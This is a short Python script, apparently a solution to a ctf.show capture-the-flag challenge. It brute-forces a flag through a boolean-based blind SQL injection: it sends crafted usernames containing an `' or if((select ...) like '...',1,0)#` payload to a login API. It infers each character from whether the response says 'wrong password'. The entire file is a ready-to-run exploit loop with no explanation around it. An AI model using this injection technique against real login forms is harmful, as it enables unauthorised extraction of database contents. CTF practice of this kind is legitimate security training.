import requests
url = "http://a6fb0851-4810-4390-befa-08d1c39b0fa9.challenge.ctf.show/api/"
flag = ""
table = "0123456789abcdefghijklmnopqrstuvwxyz-,{}_"

for i in range(1,99):
    for j in table:
        pay = flag+j+'%'
        username_data = f"' or if((select group_concat(f1ag) from ctfshow_flxg) like '{pay}',1,0)#"
        data = {'username': username_data,
                'password': 1}
        r = requests.post(url=url, data=data).text
        if r"\u5bc6\u7801\u9519\u8bef" in r:
            flag += j
            print(flag)
            if j == "}":
                exit()
            break